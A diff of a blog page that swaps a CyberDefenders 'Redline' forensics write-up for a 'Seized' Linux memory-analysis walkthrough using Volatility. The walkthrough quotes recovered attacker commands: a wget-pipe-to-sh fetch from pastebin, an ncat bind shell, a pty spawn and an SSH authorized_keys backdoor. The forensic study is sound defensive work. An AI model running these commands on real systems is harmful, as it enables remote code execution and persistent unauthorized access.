@@ -15,14 +15,14 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <meta http-equiv="X-UA-Compatible" content="ie=edge" />
   
-  <title>Cyberdefenders · Digital Forensics · Redline &middot; nathan.out</title>
-    <meta name="title" content="Cyberdefenders · Digital Forensics · Redline &middot; nathan.out" />
+  <title> &middot; nathan.out</title>
+    <meta name="title" content=" &middot; nathan.out" />
   
   
   
   
   
-  <link rel="canonical" href="https://nathan-out.github.io/write-up/cyberdefenders-digital-forensics-redline/" />
+  <link rel="canonical" href="https://nathan-out.github.io/write-up/wu/" />
   
   
   
@@ -71,18 +71,18 @@
   
   
   
-  <meta property="og:title" content="Cyberdefenders · Digital Forensics · Redline" />
-<meta property="og:description" content="The Scenario:
-As a member of the Security Blue team, your assignment is to analyze a memory dump using Redline and Volatility tools." />
+  <meta property="og:title" content="" />
+<meta property="og:description" content="Seized # The Scenario:
+Using Volatility, utilize your memory analysis skills as a security blue team analyst to Investigate the provided Linux memory snapshots and figure out attack details." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://nathan-out.github.io/write-up/cyberdefenders-digital-forensics-redline/" /><meta property="article:section" content="write-up" />
-<meta property="article:published_time" content="2023-07-22T16:23:52+03:00" />
-<meta property="article:modified_time" content="2023-07-22T16:23:52+03:00" /><meta property="og:site_name" content="nathan.out" />
+<meta property="og:url" content="https://nathan-out.github.io/write-up/wu/" /><meta property="article:section" content="write-up" />
+
+<meta property="og:site_name" content="nathan.out" />
 
   <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="Cyberdefenders · Digital Forensics · Redline"/>
-<meta name="twitter:description" content="The Scenario:
-As a member of the Security Blue team, your assignment is to analyze a memory dump using Redline and Volatility tools."/>
+<meta name="twitter:title" content=""/>
+<meta name="twitter:description" content="Seized # The Scenario:
+Using Volatility, utilize your memory analysis skills as a security blue team analyst to Investigate the provided Linux memory snapshots and figure out attack details."/>
 
   
   <script type="application/ld+json">
@@ -90,26 +90,26 @@ As a member of the Security Blue team, your assignment is to analyze a memory du
     "@context": "https://schema.org",
     "@type": "Article",
     "articleSection": "Write-up",
-    "name": "Cyberdefenders · Digital Forensics · Redline",
-    "headline": "Cyberdefenders · Digital Forensics · Redline",
+    "name": "",
+    "headline": "",
     
-    "abstract": "The Scenario:\nAs a member of the Security Blue team, your assignment is to analyze a memory dump using Redline and Volatility tools.",
+    "abstract": "Seized # The Scenario:\nUsing Volatility, utilize your memory analysis skills as a security blue team analyst to Investigate the provided Linux memory snapshots and figure out attack details.",
     "inLanguage": "fr-fr",
-    "url" : "https:\/\/nathan-out.github.io\/write-up\/cyberdefenders-digital-forensics-redline\/",
+    "url" : "https:\/\/nathan-out.github.io\/write-up\/wu\/",
     "author" : {
       "@type": "Person",
       "name": "nathan.out"
     },
-    "copyrightYear": "2023",
-    "dateCreated": "2023-07-22T16:23:52\u002b03:00",
-    "datePublished": "2023-07-22T16:23:52\u002b03:00",
     
-    "dateModified": "2023-07-22T16:23:52\u002b03:00",
+    
+    
+    
+    
     
     
     
     "mainEntityOfPage": "true",
-    "wordCount": "697"
+    "wordCount": "1031"
   }]
   </script>
 
@@ -256,8 +256,8 @@ As a member of the Security Blue team, your assignment is to analyze a memory du
   <li class="inline hidden">
     <a
       class="hover:underline decoration-neutral-300 dark:underline-neutral-600"
-      href="/write-up/cyberdefenders-digital-forensics-redline/"
-      >Cyberdefenders · Digital Forensics · Redline</a
+      href="/write-up/wu/"
+      >write-up</a
     ><span class="px-1 text-primary-500">/</span>
   </li>
 
@@ -266,7 +266,7 @@ As a member of the Security Blue team, your assignment is to analyze a memory du
 
       
       <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
-        Cyberdefenders · Digital Forensics · Redline
+        
       </h1>
       <div class="mt-8 mb-12 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
         
@@ -301,7 +301,7 @@ As a member of the Security Blue team, your assignment is to analyze a memory du
   <div class="flex flex-row flex-wrap items-center">
     
     
-      <time datetime="2023-07-22 16:23:52 &#43;0300 EEST">22 juillet 2023</time><span class="px-2 text-primary-500">&middot;</span><span title="Temps de lecture">4 mins</span>
+      <time datetime="0001-01-01 00:00:00 &#43;0000 UTC">1 janvier 1</time><span class="px-2 text-primary-500">&middot;</span><span title="Temps de lecture">5 mins</span>
     
 
     
@@ -329,15 +329,15 @@ As a member of the Security Blue team, your assignment is to analyze a memory du
   >
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#abstract">Abstract</a></li>
-    <li><a href="#1-what-is-the-name-of-the-suspicious-process">1. What is the name of the suspicious process?</a></li>
-    <li><a href="#2-what-is-the-child-process-name-of-the-suspicious-process">2. What is the child process name of the suspicious process?</a></li>
-    <li><a href="#3-what-is-the-memory-protection-applied-to-the-suspicious-process-memory-region">3. What is the memory protection applied to the suspicious process memory region?</a></li>
-    <li><a href="#4-what-is-the-name-of-the-process-responsible-for-the-vpn-connection">4. What is the name of the process responsible for the VPN connection?</a></li>
-    <li><a href="#5-what-is-the-attackers-ip-address">5. What is the attacker&rsquo;s IP address?</a></li>
-    <li><a href="#6-based-on-the-previous-artifacts-what-is-the-name-of-the-malware-family">6. Based on the previous artifacts. What is the name of the malware family?</a></li>
-    <li><a href="#7-what-is-the-full-url-of-the-php-file-that-the-attacker-visited">7. What is the full URL of the PHP file that the attacker visited?</a></li>
-    <li><a href="#8-what-is-the-full-path-of-the-malicious-executable">8. What is the full path of the malicious executable?</a></li>
+    <li><a href="#q1-what-is-the-centos-version-installed-on-the-machine">Q1. What is the CentOS version installed on the machine?</a></li>
+    <li><a href="#q2-there-is-a-command-containing-a-strange-message-in-the-bash-history-will-you-be-able-to-read-it">Q2. There is a command containing a strange message in the bash history. Will you be able to read it?</a></li>
+    <li><a href="#q3-what-is-the-pid-of-the-suspicious-process">Q3. What is the PID of the suspicious process?</a></li>
+    <li><a href="#q4-the-attacker-downloaded-a-backdoor-to-gain-persistence-what-is-the-hidden-message-in-this-backdoor">Q4. The attacker downloaded a backdoor to gain persistence. What is the hidden message in this backdoor?</a></li>
+    <li><a href="#q5-what-are-the-attackers-ip-address-and-the-local-port-on-the-targeted-machine">Q5. What are the attacker&rsquo;s IP address and the local port on the targeted machine?</a></li>
+    <li><a href="#q6-what-is-the-first-command-that-the-attacker-executed">Q6. What is the first command that the attacker executed?</a></li>
+    <li><a href="#q7-after-changing-the-user-password-we-found-that-the-attacker-still-has-access-can-you-find-out-how">Q7. After changing the user password, we found that the attacker still has access. Can you find out how?</a></li>
+    <li><a href="#q8-what-is-the-name-of-the-rootkit-that-the-attacker-used">Q8. What is the name of the rootkit that the attacker used?</a></li>
+    <li><a href="#q9-the-rootkit-uses-crc65-encryption-what-is-the-key">Q9. The rootkit uses crc65 encryption. What is the key?</a></li>
   </ul>
 </nav>
   </div>
@@ -347,78 +347,108 @@ As a member of the Security Blue team, your assignment is to analyze a memory du
         </div>
       
       <div class="min-w-0 min-h-0 max-w-prose">
-        <p>The Scenario:</p>
+        <h1 id="seized" class="relative group">Seized <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#seized" aria-label="Ancre">#</a></span></h1>
+<p>The Scenario:</p>
 <blockquote>
-<p>As a member of the Security Blue team, your assignment is to analyze a memory dump using Redline and Volatility tools. Your goal is to trace the steps taken by the attacker on the compromised machine and determine how they managed to bypass the Network Intrusion Detection System &ldquo;NIDS&rdquo;. Your investigation will involve identifying the specific malware family employed in the attack, along with its characteristics. Additionally, your task is to identify and mitigate any traces or footprints left by the attacker.</p>
+<p>Using Volatility, utilize your memory analysis skills as a security blue team analyst to Investigate the provided Linux memory snapshots and figure out attack details.</p>
 </blockquote>
-<p>Tools:</p>
+<h2 id="q1-what-is-the-centos-version-installed-on-the-machine" class="relative group">Q1. What is the CentOS version installed on the machine? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q1-what-is-the-centos-version-installed-on-the-machine" aria-label="Ancre">#</a></span></h2>
+<p>The archive name provides the kernel version, using the <a href="https://en.wikipedia.org/wiki/CentOS">CentOS Wikipedia page</a> you will see that the corresponding CentOS version is <code>7.7-1908</code>.</p>
+<h2 id="q2-there-is-a-command-containing-a-strange-message-in-the-bash-history-will-you-be-able-to-read-it" class="relative group">Q2. There is a command containing a strange message in the bash history. Will you be able to read it? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q2-there-is-a-command-containing-a-strange-message-in-the-bash-history-will-you-be-able-to-read-it" aria-label="Ancre">#</a></span></h2>
+<p>Using <code>linux_bash</code> plugin we could see that the user put content in a file : <code>echo &quot;c2hrQ1RGe2wzdHNfc3Q0cnRfdGgzXzFudjNzdF83NWNjNTU0NzZmM2RmZTE2MjlhYzYwfQo=&quot; &gt; y0ush0uldr34dth1s.txt</code>. Decode the base64 using cyberchef gives the flag.</p>
+<h2 id="q3-what-is-the-pid-of-the-suspicious-process" class="relative group">Q3. What is the PID of the suspicious process? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q3-what-is-the-pid-of-the-suspicious-process" aria-label="Ancre">#</a></span></h2>
+<p><code>linux_pstree</code> shows more than 200 processes. Instead to explore each of them, a clever way is to directly focuse on strange processes using <code>linux_malfind</code> :</p>
+<pre tabindex="0"><code class="language-log" data-lang="log">Process: gnome-terminal- Pid: 2535 Address: 0x7f1d414bf000 File: Anonymous Mapping
+Protection: VM_READ|VM_WRITE|VM_EXEC
+Flags: VM_READ|VM_WRITE|VM_EXEC|VM_MAYREAD|VM_MAYWRITE|VM_MAYEXEC|VM_ACCOUNT|VM_CAN_NONLINEAR
+
+0x007f1d414bf000  78 5f 00 00 00 00 00 00 00 00 00 00 00 00 00 00   x_..............
+0x007f1d414bf010  53 41 57 41 56 41 55 55 48 8b df 48 81 ec 50 02   SAWAVAUUH..H..P.
+0x007f1d414bf020  00 00 48 8b 43 10 48 83 e8 01 48 8d 74 24 58 48   ..H.C.H...H.t$XH
+0x007f1d414bf030  c7 c1 13 00 00 00 48 89 46 08 48 8d 76 08 48 83   ......H.F.H.v.H.
+</code></pre><p>Exploring this PID on the <code>pstree</code>, proove that there is something suspicious, as <code>insmod</code> is used to insert modules into the kernel :</p>
+<pre tabindex="0"><code class="language-log" data-lang="log">...
+.gnome-terminal-     2535            1000
+..gnome-pty-helpe    2621            1000
+..bash               2622            1000
+...sudo              3612
+....insmod           3614
+...
+</code></pre><p><strong>Unfortunately, that&rsquo;s none of them.</strong> Suspicious activity is not always malicious.</p>
+<p>Exploring again the <code>pstree</code>, we can see something else suspicious :</p>
+<pre tabindex="0"><code class="language-log" data-lang="log">.ncat                2854
+..bash               2876
+...python            2886
+....bash             2887
+.....vim             3196
+</code></pre><p>This one is more suspicious than the previous one because of the <code>ncat</code> (network process) launching some scripts.</p>
+<h2 id="q4-the-attacker-downloaded-a-backdoor-to-gain-persistence-what-is-the-hidden-message-in-this-backdoor" class="relative group">Q4. The attacker downloaded a backdoor to gain persistence. What is the hidden message in this backdoor? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q4-the-attacker-downloaded-a-backdoor-to-gain-persistence-what-is-the-hidden-message-in-this-backdoor" aria-label="Ancre">#</a></span></h2>
+<p>I was unable to find this answer. I tried to list all the cached files using <code>linux_cached_file</code> to see if there is some suspicious one and dump it, but I found nothing. I tried to dump the suspicious process but without results too.</p>
+<p>I also tried the github present in the bash history but I didn&rsquo;t see the hidden line pushed to the right :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span>os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;wget -O - https://pastebin.com/raw/nQwMKjtZ 2&gt;/dev/null|sh&#39;</span>)
+</span></span></code></pre></div><p>A write-up gave me the flag because the links seems not valid anymore. This pastebin should contains a base64 strings which is the flag :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">### Congratz : c2hrQ1RGe3RoNHRfdzRzXzRfZHVtYl9iNGNrZDAwcl84NjAzM2MxOWUzZjM5MzE1YzAwZGNhfQo=</span>
+</span></span><span style="display:flex;"><span>nohup ncat -lvp <span style="color:#ae81ff">12345</span> -4 -e /bin/bash &gt; /dev/null 2&gt;/dev/null &amp;
+</span></span></code></pre></div><h2 id="q5-what-are-the-attackers-ip-address-and-the-local-port-on-the-targeted-machine" class="relative group">Q5. What are the attacker&rsquo;s IP address and the local port on the targeted machine? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q5-what-are-the-attackers-ip-address-and-the-local-port-on-the-targeted-machine" aria-label="Ancre">#</a></span></h2>
+<p>Using <code>linux_netstat</code> returns a lot of information but at the end of the output we could see theses lines :</p>
+<pre tabindex="0"><code class="language-log" data-lang="log">TCP      192.168.49.135  :12345 192.168.49.1    :44122 ESTABLISHED                  ncat/2854 
+TCP      192.168.49.135  :12345 192.168.49.1    :44122 ESTABLISHED                  bash/2876 
+TCP      192.168.49.135  :12345 192.168.49.1    :44122 ESTABLISHED                python/2886 
+TCP      192.168.49.135  :12345 192.168.49.1    :44122 ESTABLISHED                  bash/2887 
+TCP      192.168.49.135  :12345 192.168.49.1    :44122 ESTABLISHED                   vim/3196 
+</code></pre><p>The <strong>local</strong> port is the one written in the script above, and the attacker&rsquo;s IP address is the other.</p>
+<h2 id="q6-what-is-the-first-command-that-the-attacker-executed" class="relative group">Q6. What is the first command that the attacker executed? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q6-what-is-the-first-command-that-the-attacker-executed" aria-label="Ancre">#</a></span></h2>
+<p>We can&rsquo;t see other commands with <code>linux_bash</code>, a different way to investigate on this kind of clues is the <code>linux_psaux</code> plug-in. The output bottom is interesting, as it contains the malware related command line arguments :</p>
+<pre tabindex="0"><code class="language-log" data-lang="log">2854   0      0      ncat -lvp 12345 -4 -e /bin/bash
+2876   0      0      /bin/bash
+2886   0      0      python -c import pty; pty.spawn(&#34;/bin/bash&#34;)
+2887   0      0      /bin/bash
+3196   0      0      vim /etc/rc.local
+3271   0      0      /usr/sbin/abrt-dbus -t133
+3279   89     89     cleanup -z -t unix -u
+3280   89     89     trivial-rewrite -n rewrite -t unix -u
+3281   0      0      local -t unix
+3299   0      0      sleep 60
+3612   0      0      sudo insmod lime-3.10.0-1062.el7.x86_64.ko path=/Linux64.mem format=lime
+3614   0      0      insmod lime-3.10.0-1062.el7.x86_64.ko path=/Linux64.mem format=lime
+</code></pre><p>Just after the <code>netcat</code>, the attackers run <code>python -c import pty; pty.spawn(&quot;/bin/bash&quot;)</code>.</p>
+<h2 id="q7-after-changing-the-user-password-we-found-that-the-attacker-still-has-access-can-you-find-out-how" class="relative group">Q7. After changing the user password, we found that the attacker still has access. Can you find out how? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q7-after-changing-the-user-password-we-found-that-the-attacker-still-has-access-can-you-find-out-how" aria-label="Ancre">#</a></span></h2>
+<p>This question is quite hard. First, you have to investigate on the <code>vim</code> process. Why this process?</p>
 <ul>
-<li>Volatility2 &amp; 3</li>
+<li>
+<p>we didn&rsquo;t care of it yet</p>
+</li>
+<li>
+<p>it&rsquo;s a part of the cyber kill chain</p>
+</li>
+<li>
+<p>intuition I guess?</p>
+</li>
 </ul>
-<p>
+<p>After dumping the process using <code>linux_dump_map</code>, we could see that the process memory contains lot of information. It contains so much that is difficult to know what to look for. We are looking for malware persistence mecanisms, we can try to ask to ChatGPT what are the most famous persistence mecanism. We can investigate on several answer but the good one is SSH keys. If we search on these files for ssh-things, we will find the answer :</p>
+<pre tabindex="0"><code class="language-logs" data-lang="logs">strings *.vma|grep -i &#39;ssh&#39;
 
+#!/bin/sh 
+     # Well played : c2hrQ1RGe3JjLmwwYzRsXzFzX2Z1bm55X2JlMjQ3MmNmYWVlZDQ2N2VjOWNhYjViNWEzOGU1ZmEwfQo=
+    
+    echo &#34;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCxa8zsyblvEoajgtqciK2XAs1UwNAeV3RcXacqicjzuad2jH7JQdIaqVW4jfEt8h7w+Rei1kZL/xqikGS/AGb2ZLqVSUKWF9afaeE850On4+c1A0wu9n/7N/t2QSnw71BZnvH35+qgENJzFGgFxJEsvZqbawFHD8B426qKFYD+LMAnnFtnrzFj8U+cewG6ODl0Obe8yP/Awv0HYFdhK/IY+t7u2Ywrgp3bXF1l5m+Zk40BqpEYfFzhawYOc/tar1HqaJnYdvqHjwhZeDGYkILvYt4veVc/DjVPX1UjLvlpWv1/AhmLAWgWyUORBwDjM5km0HjN/CY5kWoasXgd1jHD tw0phi@workstation&#34; &gt;&gt; /home/k3vin/.ssh/authorized_keys &amp;&amp; chmod 600 /home/k3vin/.ssh/authorized_keys
+    &#34;/etc/rc.local&#34; 3L, 596C
+    1,1           
+    All zed_keys&gt; /home/k3vin/.ssh/authorized_keys &amp;&amp; 
+    chmod 600 /home/k3vin/.ssh/authori
+</code></pre><p>The first base64 encoded string is the flag. It&rsquo;s interesting to capitalize on knowledge to understand this persistance mecanism :</p>
+<p><strong>This code add a SSH key for the K3vin user and modify its permissions in a manner that only this user can modify it.</strong></p>
+<h2 id="q8-what-is-the-name-of-the-rootkit-that-the-attacker-used" class="relative group">Q8. What is the name of the rootkit that the attacker used? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q8-what-is-the-name-of-the-rootkit-that-the-attacker-used" aria-label="Ancre">#</a></span></h2>
+<p>Thanks to this tutorial, <a href="https://downloads.volatilityfoundation.org/omfw/2012/OMFW2012_Case.pdf">Analyzing Linux Rootkits with Volatility</a>, we learned some ways to detect rootkit on a Linux system. One of them is to investigate on syscalls using <code>linux_check_syscall</code>. This command returns lot of information but we are only interested in the hooked syscalls.</p>
+<pre tabindex="0"><code class="language-logs" data-lang="logs">Table Name Index System Call              Handler Address    Symbol                                                      
+---------- ----- ------------------------ ------------------ ------------------------------------------------------------
+64bit         88                          0xffffffffc0a12470 HOOKED: sysemptyrect/syscall_callback
+...
+64bit        332                          0x6461625f6e726177 HOOKED: UNKNOWN
+</code></pre><p>Firstly, I was quite lost ; how can I find the rootkit name ? In fact, the <code>Symbol</code> column contains the rootkit name here.</p>
+<h2 id="q9-the-rootkit-uses-crc65-encryption-what-is-the-key" class="relative group">Q9. The rootkit uses crc65 encryption. What is the key? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#q9-the-rootkit-uses-crc65-encryption-what-is-the-key" aria-label="Ancre">#</a></span></h2>
+<p>Firstly, I searched on internet if this rootkit has a known crc65 encryption key. I found many Write-Up but searching <code>sysemptyrect</code> in the dump file (using <code>grep</code> for example) will give you the key.</p>
 
-
-  
-  
-  
-    <figure>
-      <img class="my-0 rounded-md" src="/img/write-up/cyberdefenders-digital-forensics-redline/redline.png" alt="RedLine Telegram channel." />
-      
-    </figure>
-  
-
-</p>
-<figcaption>RedLine Telegram channel.</figcaption>
-<h2 id="abstract" class="relative group">Abstract <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#abstract" aria-label="Ancre">#</a></span></h2>
-<p>This Blue Team challenge writeup involves analyzing a suspicious process found in memory using the volatility framework. The process name is &ldquo;oneetx.exe&rdquo; and exhibits a suspicious behavior with the memory protection set to &ldquo;PAGE_EXECUTE_READWRITE,&rdquo; which can evade antivirus detection.</p>
-<p>Further investigation reveals a child process named &ldquo;rundll32.exe&rdquo; associated with the suspicious process. The investigation also identifies the presence of a VPN program named &ldquo;Outline.exe,&rdquo; which might be responsible for the attacker&rsquo;s VPN connection. However, the attacker&rsquo;s IP address cannot be retrieved using Volatility2, but Volatility3 successfully extracts the IP address as &ldquo;77.91.124.20.&rdquo; By cross-referencing this IP address on VirusTotal, it is determined that the malware belongs to the &ldquo;RedLine Stealer&rdquo; family.</p>
-<p>Additionally, the URL of the PHP file visited by the attacker is found on VirusTotal, as well as by analyzing the process memory, resulting in the complete URL. Finally, the full path of the malicious executable, &ldquo;oneetx.exe,&rdquo; is obtained through process memory analysis.</p>
-<h2 id="1-what-is-the-name-of-the-suspicious-process" class="relative group">1. What is the name of the suspicious process? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#1-what-is-the-name-of-the-suspicious-process" aria-label="Ancre">#</a></span></h2>
-<pre tabindex="0"><code>vol.py -f &lt;file&gt; imageinfo
-</code></pre><pre tabindex="0"><code>vol.py -f &lt;file&gt; --profile=&lt;profile&gt; malfind
-
-Process: oneetx.exe Pid: 5896 Address: 0x400000
-Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE
-Flags: PrivateMemory: 1, Protection: 6
-
-0x0000000000400000  4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00   MZ..............
-0x0000000000400010  b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00   ........@.......
-0x0000000000400020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
-0x0000000000400030  00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00   ................
-</code></pre><p>PAGE_EXECUTE_READWRITE allows the program to modify its code or be modified by another process during execution. This could help to evade antivirus detection. When <code>malfind</code> found something, it&rsquo;s likely a bad new as it scan the image to find injected code blocks.</p>
-<h2 id="2-what-is-the-child-process-name-of-the-suspicious-process" class="relative group">2. What is the child process name of the suspicious process? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#2-what-is-the-child-process-name-of-the-suspicious-process" aria-label="Ancre">#</a></span></h2>
-<pre tabindex="0"><code>pstree
-
- 0xffffad8189b41080:oneetx.exe                       5896   8844      5      0 2023-05-21 22:30:56 UTC+0000
-. 0xffffad818d1912c0:rundll32.exe                    7732   5896      1      0 2023-05-21 22:31:53 UTC+0000
-</code></pre><h2 id="3-what-is-the-memory-protection-applied-to-the-suspicious-process-memory-region" class="relative group">3. What is the memory protection applied to the suspicious process memory region? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#3-what-is-the-memory-protection-applied-to-the-suspicious-process-memory-region" aria-label="Ancre">#</a></span></h2>
-<p>Fount with <code>malfind</code>.</p>
-<h2 id="4-what-is-the-name-of-the-process-responsible-for-the-vpn-connection" class="relative group">4. What is the name of the process responsible for the VPN connection? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#4-what-is-the-name-of-the-process-responsible-for-the-vpn-connection" aria-label="Ancre">#</a></span></h2>
-<p>A program looks different as it&rsquo;s not a Windows default: Outline.exe. Searching this name on internet allows you to know that this a VPN program.</p>
-<h2 id="5-what-is-the-attackers-ip-address" class="relative group">5. What is the attacker&rsquo;s IP address? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#5-what-is-the-attackers-ip-address" aria-label="Ancre">#</a></span></h2>
-<p>Surprisingly, Volatility2 was not able to retrieve this information. When I tried to perform <code>netscan</code>, the connection was marked as close and I can&rsquo;t get the remode IP address.</p>
-<p>With vol3, you can retrieve this information easily:</p>
-<pre tabindex="0"><code>vol.py -f &#34;MemoryDump.mem&#34; windows.netscan|grep -i 5896
-
-Offset	Proto	LocalAddr	LocalPort	ForeignAddr	ForeignPort	State	PID	Owner	Created
-0xad818de4aa20.0TCPv4	10.0.85.2DB scan55462fin 77.91.124.20    80             CLOSED	5896	oneetx.exe	2023-05-21 23:01:22.000000
-</code></pre><h2 id="6-based-on-the-previous-artifacts-what-is-the-name-of-the-malware-family" class="relative group">6. Based on the previous artifacts. What is the name of the malware family? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#6-based-on-the-previous-artifacts-what-is-the-name-of-the-malware-family" aria-label="Ancre">#</a></span></h2>
-<p>We have few IOCs, the most usefull one is probably the IP address. Using VirusTotal, in the details section, on the Google results part, you will see that is a <strong>RedLine Stealer</strong>.</p>
-<h2 id="7-what-is-the-full-url-of-the-php-file-that-the-attacker-visited" class="relative group">7. What is the full URL of the PHP file that the attacker visited? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#7-what-is-the-full-url-of-the-php-file-that-the-attacker-visited" aria-label="Ancre">#</a></span></h2>
-<p>You can retrieve this information on VirusTotal too. But, you can also dump the process memory and search on it:</p>
-<pre tabindex="0"><code>vol.py -f &#34;MemoryDump.mem&#34; -o &lt;output_dir&gt; windows.memmap --dump --pid 5896
-
-# extracts strings
-strings -el &lt;output_dir&gt;/pid.5896.dmp strings_5896
-
-# search on the IOC
-grep -i &#39;http://77.91.124.20&#39; strings_5896
-</code></pre><p>You will find the complete path.</p>
-<h2 id="8-what-is-the-full-path-of-the-malicious-executable" class="relative group">8. What is the full path of the malicious executable? <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#8-what-is-the-full-path-of-the-malicious-executable" aria-label="Ancre">#</a></span></h2>
-<p>Using the same file, you can look up for the file name and retrieve is location:</p>
-<pre tabindex="0"><code>grep -ie &#39;oneetx\.exe&#39; strings_5896
-</code></pre>
       </div>
     </section>
     <footer class="pt-8 max-w-prose print:hidden">
@@ -487,7 +517,7 @@ grep -i &#39;http://77.91.124.20&#39; strings_5896
       <div class="flex justify-between pt-3">
         <span>
           
-            <a class="flex group" href="/write-up/cyberdefenders-digital-forensics-nintendohunt/">
+            <a class="flex group" href="/write-up/wu2/">
               <span
                 class="mr-3 ltr:inline rtl:hidden text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400"
                 >&larr;</span
@@ -499,11 +529,11 @@ grep -i &#39;http://77.91.124.20&#39; strings_5896
               <span class="flex flex-col">
                 <span
                   class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >Cyberdefenders · Digital Forensics · NintendoHunt</span
+                  ></span
                 >
                 <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                   
-                    <time datetime="2023-05-03 13:20:01 &#43;0200 &#43;0200">3 mai 2023</time>
+                    <time datetime="0001-01-01 00:00:00 &#43;0000 UTC">1 janvier 1</time>
                   
                 </span>
               </span>
@@ -512,15 +542,15 @@ grep -i &#39;http://77.91.124.20&#39; strings_5896
         </span>
         <span>
           
-            <a class="flex text-right group" href="/write-up/cyberdefenders-digital-forensics-seized/">
+            <a class="flex text-right group" href="/write-up/cyberdefenders-digital-forensics-azurepot/">
               <span class="flex flex-col">
                 <span
                   class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
-                  >Cyberdefenders · Digital Forensics · Seized</span
+                  >Cyberdefenders · Digital Forensics · Azurepot</span
                 >
                 <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                   
-                    <time datetime="2023-08-02 21:59:01 &#43;0300 EEST">2 août 2023</time>
